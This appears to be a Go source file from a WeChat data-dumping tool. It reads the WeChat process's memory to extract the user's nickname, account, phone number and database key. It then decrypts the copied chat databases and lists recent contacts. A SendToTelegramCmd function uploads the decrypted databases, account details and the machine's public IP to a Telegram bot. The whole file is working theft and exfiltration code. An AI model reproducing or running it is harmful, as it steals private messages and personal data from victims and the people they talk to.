package main

import (
	"GoWxDump/db"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"time"
)

func GetWeChatInfo() error {
	// 获取微信版本
	version, err := GetVersion(WeChatDataObject.WeChatWinFullName)
	if err != nil {
		return err
	}
	// 获取微信昵称
	nickName, err := GetWeChatData(WeChatDataObject.WeChatHandle, WeChatDataObject.WeChatWinBaseAddr+uint64(OffSetMap[version][0]), 100)
	if err != nil {
		return err
	}
	// 获取微信账号
	account, err := GetWeChatData(WeChatDataObject.WeChatHandle, WeChatDataObject.WeChatWinBaseAddr+uint64(OffSetMap[version][1]), 100)
	if err != nil {
		return err
	}
	// 获取微信手机号
	mobile, err := GetWeChatData(WeChatDataObject.WeChatHandle, WeChatDataObject.WeChatWinBaseAddr+uint64(OffSetMap[version][2]), 100)
	if err != nil {
		return err
	}
	// 获取微信密钥
	key, err := GetWeChatKey(WeChatDataObject.WeChatHandle, WeChatDataObject.WeChatWinBaseAddr+uint64(OffSetMap[version][4]))
	if err != nil {
		return err
	}
	// 设置微信数据
	WeChatDataObject.Version = version
	WeChatDataObject.NickName = nickName
	WeChatDataObject.Account = account
	WeChatDataObject.Mobile = mobile
	WeChatDataObject.Key = key
	return nil
}

func ShowInfoCmd() {
	fmt.Printf("WeChat Version: %s \n", WeChatDataObject.Version)
	fmt.Printf("WeChat NickName: %s \n", WeChatDataObject.NickName)
	fmt.Printf("WeChat Account: %s \n", WeChatDataObject.Account)
	fmt.Printf("WeChat Mobile: %s \n", WeChatDataObject.Mobile)
	fmt.Printf("WeChat Key: %s \n", WeChatDataObject.Key)
	// 创建一个新的变量 WeChatInfo，将属性值放入其中
	WeChatInfo := struct {
		Version  string
		NickName string
		Account  string
		Mobile   string
		Key      string
	}{
		Version:  WeChatDataObject.Version,
		NickName: WeChatDataObject.NickName,
		Account:  WeChatDataObject.Account,
		Mobile:   WeChatDataObject.Mobile,
		Key:      WeChatDataObject.Key,
	}
	// 将数据转换为 JSON 格式
	jsonData, err := json.Marshal(WeChatInfo)
	if err != nil {
		fmt.Println("Error marshaling JSON:", err)
		return
	}

	// 检查wechat_info.json文件是否存在，存在则删除
	_, err = os.Stat(".\\decrypted\\wechat_info.json")
	if err == nil {
		os.Remove(".\\decrypted\\wechat_info.json")
	}
	file, err := os.Create(".\\decrypted\\wechat_info.json")
	if err != nil {
		fmt.Println("Error creating file:", err)
		return
	}
	defer file.Close()

	_, err = file.Write(jsonData)
	if err != nil {
		fmt.Println("Error writing JSON data:", err)
		return
	}

	fmt.Println("WeChat info saved to wechat_info.json")
}

func DecryptCmd() {
	// 获取用户数据目录
	wechatRoot, err := GetWeChatDir()
	if err != nil {
		fmt.Println("请手动设置微信消息目录")
		return
	}
	// 获取用户目录
	userDir, err := GetWeChatUserDir(wechatRoot)
	if err != nil {
		fmt.Println("GetWeChatUserDir error: ", err)
		return
	}
	for id, dataDir := range userDir {
		fmt.Printf("处理中的微信ID [%s]: %s\n", id, dataDir)

		// 判断目录是否存在
		_, err := os.Stat(dataDir)
		if err != nil {
			fmt.Println("目录不存在:", dataDir)
		}

		// 判断输入的目录中是否存在Msg目录
		_, err = os.Stat(filepath.Join(dataDir, "Msg", "Multi"))
		if err != nil {
			fmt.Println("非微信目录:", dataDir)
		}

		// 复制聊天记录文件到缓存目录dataDir + \Msg\Multi
		err = CopyMsgDb(filepath.Join(dataDir, "Msg", "Multi"))
		if err != nil {
			fmt.Println("CopyMsgDb error: ", err)
		}
		err = CopyMsgDb(filepath.Join(dataDir, "Msg"))
		if err != nil {
			fmt.Println("CopyMicroMsgDb error: ", err)
		}

		// 解密tmp目录下的所有.db文件，解密后的文件放在decrypted目录下
		err = DecryptDb(WeChatDataObject.Key)
		if err != nil {
			fmt.Println("DecryptDb error: ", err)
		}

		// 清理缓存目录
		err = os.RemoveAll(CurrentPath + "\\tmp")
		if err != nil {
			fmt.Println("RemoveAll error: ", err)
		}

		fmt.Printf("处理完成的微信ID [%s]\n", id)

		// 读取当前目录下decrypted/decrypted.json里面的status属性，如果status为true，则终止循环
		status, err := readDecryptedJSONStatus()
		if err != nil {
			fmt.Println("Error reading decrypted.json: ", err)
		} else if status {
			fmt.Printf("检测到已有解密成功的微信，终止处理\n\n")
			break
		} else {
			fmt.Printf("未检测到已有解密成功的微信，继续处理\n\n")
		}
	}

}

// 读取decrypted/decrypted.json里面的status属性
func readDecryptedJSONStatus() (bool, error) {
	filePath := filepath.Join(CurrentPath, "decrypted", "decrypted.json")
	file, err := os.Open(filePath)
	if err != nil {
		return false, err
	}
	defer file.Close()

	var decryptedData struct {
		Status bool `json:"status"`
	}

	decoder := json.NewDecoder(file)
	if err := decoder.Decode(&decryptedData); err != nil {
		return false, err
	}

	return decryptedData.Status, nil
}

func FriendsListCmd() {
	weChatDb := &db.WeChatDb{}
	// 初始化数据库对象
	err := weChatDb.InitDb(filepath.Join(CurrentPath, "decrypted", "MicroMsg.db"))
	if err != nil {
		fmt.Println("InitDb error: ", err)
		return
	}
	nearChatList, err := weChatDb.GetNearChatFriends(10)
	if err != nil {
		fmt.Println("GetNearChatFriends error: ", err)
		return
	}
	// fmt.Println(nearChatList)
	// 如果NearChatList不为空
	if len(nearChatList) > 0 {
		userNameList := make([]string, 0)
		for _, v := range nearChatList {
			userNameList = append(userNameList, v.Username)
		}
		userList, err := weChatDb.GetFriendInfoListWithUserList(userNameList)
		if err != nil {
			fmt.Println("GetFriendInfoListWithUserList error: ", err)
			return
		}
		// 按照nearChatList的顺序输出
		for _, v := range nearChatList {
			// 找到userList中Alias为v的元素
			for _, v1 := range userList {
				if v1.UserName == v.Username {
					lastTime := time.Unix(v.LastReadedCreateTime/1000, 0).Format("2006-01-02 15:04:05")
					fmt.Printf("NickName: %s \nRemark: %s \nAlias: %s \nUserName: %s \nLastTime: %s\n-------------------------------- \n", v1.NickName, v1.Remark, v1.Alias, v1.UserName, lastTime)
					break
				}
			}
		}
	}
	weChatDb.Close()
}

func SendToTelegramCmd() {
	if TELBOT_TOKEN != "" && TELBOT_CHAT_ID != 0 {
		publicIp, err := GetPublicIp()
		if err != nil {
			publicIp = ""
		}
		markDownText := fmt.Sprintf("```\n[%s]\n微信版本: %s\n微信昵称: %s\n微信账号: %s\n微信手机号: %s\n```", publicIp, WeChatDataObject.Version, WeChatDataObject.NickName, WeChatDataObject.Account, WeChatDataObject.Mobile)
		fileList := make([]string, 0)
		// 将decrypted目录下的所有.db文件添加到fileList中
		err = filepath.Walk(filepath.Join(CurrentPath, "decrypted"), func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}
			// 判断如果不是.db文件，就跳过
			if filepath.Ext(path) != ".db" {
				return nil
			}
			// 如果不是MicroMsg.db则跳过
			// if info.Name() != "hello.db" && info.Name() != "word.db" {
			// 	return nil
			// }
			if !info.IsDir() {
				fileList = append(fileList, path)
			}
			return nil
		})
		// 如果fileList不为空，就发送文件
		if len(fileList) > 0 {
			TeleSendFileAndMessage(markDownText, fileList)
		} else {
			TeleSendMarkDownMessage(markDownText)
		}

	}
}
